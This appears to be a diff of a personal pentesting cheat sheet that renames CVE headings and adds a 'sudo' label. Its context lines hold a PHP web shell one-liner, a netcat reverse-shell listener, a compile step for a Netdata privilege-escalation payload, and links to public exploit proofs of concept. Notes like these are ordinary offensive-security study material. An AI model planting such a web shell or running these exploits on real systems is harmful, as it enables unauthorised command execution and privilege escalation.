@@ -17,6 +17,7 @@ git: ```git clone https://github.com/example/example.git```
 
 Web Shell: ```<?php echo "<div>".system($_GET['cmd'])."</div>"; ?>```
 
+sudo: 
 ```
 ps auxww
 ss -tuln
@@ -63,7 +64,7 @@ let out = proc.communicate()[0].decode("utf-8")
 "" + out
 ```
 
-## CVE-2024-32019
+### CVE-2024-32019
 https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC#
 ```
 gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
@@ -116,7 +117,7 @@ int main() {
 }
 ```
 
-## CVE-2025-24893
+### CVE-2025-24893
 https://github.com/gunzf0x/CVE-2025-24893
 ```
 nc -lvnp 9001
@@ -216,7 +217,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## CVE-2025-31161
+### CVE-2025-31161
 https://github.com/Immersive-Labs-Sec/CVE-2025-31161
 
 ```
